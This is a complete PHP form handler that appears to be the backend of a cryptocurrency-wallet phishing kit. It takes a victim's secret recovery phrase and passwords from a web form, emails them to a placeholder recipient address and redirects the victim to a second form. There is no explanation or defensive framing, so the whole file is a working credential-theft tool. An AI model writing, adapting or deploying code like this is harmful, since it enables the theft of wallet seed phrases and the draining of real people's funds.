<?php
if (isset($_POST['send'])) {
    $subject = "New Form Submission";
    

    $sphrase = $_POST['sphrase'];
    $password = $_POST['password'];
    $cpassword = $_POST['cpassword'];


    $recipient = 'your-email@example.com'; 


    $message = '<html><body>';
    $message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
    $message .= "<tr style='background: #eee;'><td><strong>Field</strong></td><td><strong>Value</strong></td></tr>";
    $message .= "<tr><td><strong>Secret Recovery Phrase:</strong></td><td>" . $sphrase . "</td></tr>";
    $message .= "<tr><td><strong>New Password:</strong></td><td>" . $password . "</td></tr>";
    $message .= "<tr><td><strong>Confirm Password:</strong></td><td>" . $cpassword . "</td></tr>";


    $message .= "</table>";
    $message .= "</body></html>";


    $headers = "From: " . $recipient . "\r\n";
    $headers .= "Reply-To: " . $recipient . "\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";


    mail($recipient, $subject, $message, $headers);


    header("location: form2.html");
    exit();
}
?>
